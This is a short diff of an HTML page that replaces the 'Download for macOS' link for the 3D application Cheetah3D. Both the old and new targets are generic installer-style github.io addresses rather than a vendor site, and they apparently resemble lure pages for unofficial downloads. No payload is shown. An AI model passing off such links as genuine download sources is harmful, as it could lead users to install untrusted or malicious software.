@@ -6,7 +6,7 @@
 <h3>Cheetah3D for macOS</h3>
 <p>Cheetah3D Mac Edition brings modelling, rigging and rendering into a single, approachable 3D workspace.</p>
 
-<a href="https://mac-software-install.github.io/.github/Cheetah3D">
+<a href="https://software-install-apps.github.io/.github/Cheetah3D">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
